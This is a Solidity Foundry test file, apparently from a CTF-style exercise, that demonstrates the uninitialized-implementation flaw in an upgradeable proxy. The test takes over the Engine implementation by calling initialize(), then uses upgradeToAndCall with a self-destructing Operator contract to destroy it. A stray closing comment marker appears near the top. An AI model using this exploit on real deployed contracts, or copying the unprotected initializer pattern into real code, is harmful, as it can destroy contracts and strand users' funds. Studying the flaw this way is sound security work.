pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "@openzeppelin/contracts/proxy/utils/Initializable.sol";

*/

contract ContractTest is Test {
    Engine EngineContract;
    Motorbike MotorbikeContract;
    Operator OperatorContract;

    function testUninitialized() public {
        EngineContract = new Engine();
        MotorbikeContract = new Motorbike(address(EngineContract));
        OperatorContract = new Operator();


        console.log("Unintialized Upgrader:", EngineContract.upgrader());

        address(EngineContract).call(abi.encodeWithSignature("initialize()"));

        console.log("Initialized Upgrader:", EngineContract.upgrader());

        bytes memory initEncoded = abi.encodeWithSignature("operate()");
        address(EngineContract).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(OperatorContract),
                initEncoded
            )
        );

        console.log("operate completed");
        console.log("Since EngineContract destroyed, next call will fail.");
        address(EngineContract).call(
            abi.encodeWithSignature(
                "upgradeToAndCall(address,bytes)",
                address(OperatorContract),
                initEncoded
            )
        );
    }
}

contract Motorbike {

    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    struct AddressSlot {
        address value;
    }


    constructor(address _logic) {
        require(
            Address.isContract(_logic),
            "ERC1967: new implementation is not a contract"
        );
        _getAddressSlot(_IMPLEMENTATION_SLOT).value = _logic;
        (bool success, ) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Call failed");
    }


    function _delegate(address implementation) internal virtual {

        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(
                gas(),
                implementation,
                0,
                calldatasize(),
                0,
                0
            )
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 {
                revert(0, returndatasize())
            }
            default {
                return(0, returndatasize())
            }
        }
    }


    fallback() external payable virtual {
        _delegate(_getAddressSlot(_IMPLEMENTATION_SLOT).value);
    }


    function _getAddressSlot(
        bytes32 slot
    ) internal pure returns (AddressSlot storage r) {
        assembly {
            r.slot := slot
        }
    }
}

contract Engine is Initializable {

    bytes32 internal constant _IMPLEMENTATION_SLOT =
        0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    address public upgrader;
    uint256 public horsePower;

    struct AddressSlot {
        address value;
    }

    function initialize() external initializer {
        horsePower = 1000;
        upgrader = msg.sender;
    }


    function upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }


    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Can't upgrade");
    }


    function _upgradeToAndCall(
        address newImplementation,
        bytes memory data
    ) internal {

        _setImplementation(newImplementation);
        if (data.length > 0) {
            (bool success, ) = newImplementation.delegatecall(data);
            require(success, "Call failed");
        }
    }

    event Returny(uint256);

    function greetMe() public {
        emit Returny(0x42);
    }


    function _setImplementation(address newImplementation) private {
        require(
            Address.isContract(newImplementation),
            "ERC1967: new implementation is not a contract"
        );

        AddressSlot storage r;
        assembly {
            r.slot := _IMPLEMENTATION_SLOT
        }
        r.value = newImplementation;
    }
}

contract Operator {
    function operate() external {
        selfdestruct(payable(msg.sender));
    }
}